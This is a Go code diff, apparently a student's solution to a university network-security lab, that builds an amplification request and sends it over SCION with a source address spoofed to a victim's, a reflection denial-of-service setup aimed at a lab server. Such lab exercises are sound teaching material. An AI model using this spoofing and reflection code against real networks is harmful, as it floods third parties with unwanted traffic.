@@ -2,25 +2,48 @@ package client
 
 import (
 	// All of these imports were used for the mastersolution
-	// "encoding/json"
-	// "fmt"
-	// "log"
-	// "net"
-	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
+
+	"fmt"
+	"log"
+	"net"
+
+	"inet.af/netaddr"
+
+	// TODO uncomment any imports you need (go optimizes away unused imports)
 	"context"
 	"time"
 
+	"ethz.ch/netsec/isl/handout/attack/server"
+	"github.com/scionproto/scion/go/lib/addr"
+	"github.com/scionproto/scion/go/lib/daemon"
 	"github.com/scionproto/scion/go/lib/snet"
-	// "ethz.ch/netsec/isl/handout/attack/server"
-	// "github.com/scionproto/scion/go/lib/addr"
-	// "github.com/scionproto/scion/go/lib/daemon"
-	// "github.com/scionproto/scion/go/lib/sock/reliable"
-	// "github.com/scionproto/scion/go/lib/spath"
+	"github.com/scionproto/scion/go/lib/snet/addrutil"
+	"github.com/scionproto/scion/go/lib/sock/reliable"
+	"github.com/scionproto/scion/go/lib/spath"
 )
 
+// hostContext contains the information needed to connect to the host's local SCION stack,
+// i.e. the connection to sciond and dispatcher.
+type hostContext struct {
+	ia            addr.IA
+	sciond        daemon.Connector
+	dispatcher    reliable.Dispatcher
+	hostInLocalAS net.IP
+}
+type scmpHandler struct{}
+
 func GenerateAttackPayload() []byte {
-	// TODO: Amplification Task
-	return make([]byte, 0)
+	// Choose which request to send
+	var q server.Query = server.Second
+	// Use API to build request
+	request := server.NewRequest(q, false, true, true, true)
+	// serialize the request with the API Marshal function
+	d, err := request.MarshalJSON()
+	if err != nil {
+		fmt.Println(err)
+		return make([]byte, 0) // empty paiload on fail
+	}
+	return d
 }
 
 func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {
@@ -35,33 +58,142 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces
 
 	// SCION dispatcher
-	/*
-		dispSockPath, err := DispatcherSocket()
-		if err != nil {
-			log.Fatal(err)
-		}
-		dispatcher := reliable.NewDispatcher(dispSockPath)
-	*/
+
+	dispSockPath, err := DispatcherSocket()
+	if err != nil {
+		log.Fatal(err)
+	}
+	dispatcher := reliable.NewDispatcher(dispSockPath)
 
 	// SCION daemon
-	/*
-		sciondAddr, err := SCIONDAddress()
-		if err != nil {
-			log.Fatal(err)
-		}
-		sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
-		if err != nil {
-			log.Fatal(err)
-		}
-	*/
+	sciondAddr := SCIONDAddress()
+
+	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	// TODO: Reflection Task
 	// Set up a scion connection with the meow-server
 	// and spoof the return address to reflect to the victim.
 	// Don't forget to set the spoofed source port with your
 	// personalized port to get feedback from the victims.
+	meowSCIONAddr, err := snet.ParseUDPAddr(meowServerAddr)
+	if err != nil {
+		log.Fatal(err)
+	}
 
+	scionNetwork := snet.NewNetwork(meowSCIONAddr.IA, dispatcher, nil)
+	scionNetwork.Dial(ctx, "udp", &net.UDPAddr{}, meowSCIONAddr, addr.SvcNone)
+
+	localIA, err := sciondConn.LocalIA(ctx)
+	hostInLocalAS, err := findAnyHostInLocalAS(ctx, sciondConn)
+	if err != nil {
+		log.Fatal("Error finding local host", err)
+	}
+	fmt.Println("hostInLocalAS", hostInLocalAS)
+	hostCtx := hostContext{
+		ia:            localIA,
+		sciond:        sciondConn,
+		dispatcher:    dispatcher,
+		hostInLocalAS: hostInLocalAS,
+	}
+	local, err := defaultLocalAddr(netaddr.IPPort{}, hostCtx)
+
+	rconn, _, err := dispatcher.Register(ctx, localIA, local.UDPAddr(), addr.SvcNone)
+	if err != nil {
+		log.Fatal("Error registering with dispatcher", err)
+	}
+	conn := snet.NewSCIONPacketConn(rconn, nil, true)
+
+	fmt.Println("meow addr, nexthop", meowSCIONAddr.Host, meowSCIONAddr.NextHop)
+	writeBuffer := make([]byte, server.MaxBufferSize)
+	pkt := &snet.Packet{
+		Bytes: writeBuffer,
+		PacketInfo: snet.PacketInfo{
+			Source: snet.SCIONAddress{
+				IA:   addr.IA(localIA),
+				Host: addr.HostFromIP(spoofedAddr.Host.IP),
+			},
+			Destination: snet.SCIONAddress{
+				IA:   addr.IA(localIA),
+				Host: addr.HostFromIP(meowSCIONAddr.Host.IP),
+			},
+			Path: spath.Path{},
+			Payload: snet.UDPPayload{
+				SrcPort: 61236,
+				DstPort: uint16(server.ServerPorts[0]),
+				Payload: payload,
+			},
+		},
+	}
+	fmt.Println("pkt info is ", pkt.PacketInfo)
+	err = conn.WriteTo(pkt, meowSCIONAddr.NextHop)
+	if err != nil {
+		log.Fatal("Write failed", err)
+	}
+
+	fmt.Println("Write success")
+
+	readBuffer := make([]byte, server.MaxBufferSize)
+	deadline := time.Now().Add(time.Second * 3)
+	err = conn.SetReadDeadline(deadline)
+	if err != nil {
+		fmt.Println("CLIENT: SetReadDeadline produced an error.", err)
+		return
+	}
+
+	pkt1 := snet.Packet{
+		Bytes: readBuffer,
+	}
+	var lastHop net.UDPAddr
+	err = conn.ReadFrom(&pkt1, &lastHop)
+	if err != nil {
+		fmt.Println("CLIENT: Error reading from connection.", err)
+		return
+	}
+	udp, ok := pkt1.Payload.(snet.UDPPayload)
+	fmt.Println(udp.Payload, ok)
+
+	/*fmt.Printf("CLIENT: Packet-received: bytes=%d from=%s\n",
+		nRead, conn.RemoteAddr())
+	var answer string
+	json.Unmarshal(readBuffer[:nRead], &answer)
+	fmt.Printf("CLIENT:The answer was: \n%s", answer)*/
+	// attackDuration := AttackDuration()
 	// for start := time.Now(); time.Since(start) < attackDuration; {
+	// 	// make request to meow with spoofed addr
+
 	// }
 	return nil
+}
+
+// findAnyHostInLocalAS returns the IP address of some (infrastructure) host in the local AS.
+func findAnyHostInLocalAS(ctx context.Context, sciondConn daemon.Connector) (net.IP, error) {
+	addr, err := daemon.TopoQuerier{Connector: sciondConn}.UnderlayAnycast(ctx, addr.SvcCS)
+	if err != nil {
+		return nil, err
+	}
+	return addr.IP, nil
+}
+
+func defaultLocalIP(host hostContext) (netaddr.IP, error) {
+	stdIP, err := addrutil.ResolveLocal(host.hostInLocalAS)
+	ip, ok := netaddr.FromStdIP(stdIP)
+	if err != nil || !ok {
+		return netaddr.IP{}, fmt.Errorf("unable to resolve default local address %w", err)
+	}
+	return ip, nil
+}
+
+// defaultLocalAddr fills in a missing or unspecified IP field with defaultLocalIP.
+func defaultLocalAddr(local netaddr.IPPort, host hostContext) (netaddr.IPPort, error) {
+	if local.IP().IsZero() || local.IP().IsUnspecified() {
+		localIP, err := defaultLocalIP(host)
+		if err != nil {
+			return netaddr.IPPort{}, err
+		}
+		local = local.WithIP(localIP)
+	}
+	return local, nil
 }
